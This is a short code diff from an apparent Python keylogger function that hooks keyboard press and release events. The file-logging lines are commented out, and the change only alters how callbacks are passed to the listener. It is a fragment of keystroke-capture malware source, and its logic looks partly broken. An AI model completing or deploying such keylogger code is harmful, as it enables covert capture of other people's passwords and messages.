@@ -9,5 +9,5 @@ def KeyLogger(listener):
     # with open('logger.txt', 'a') as f:
         # f.write(logs)
     on_release(listener)
-    with Listener(on_press=on_press, on_release=on_release) as listener:
+    with Listener(on_press,on_release) as listener:
         listener.join()
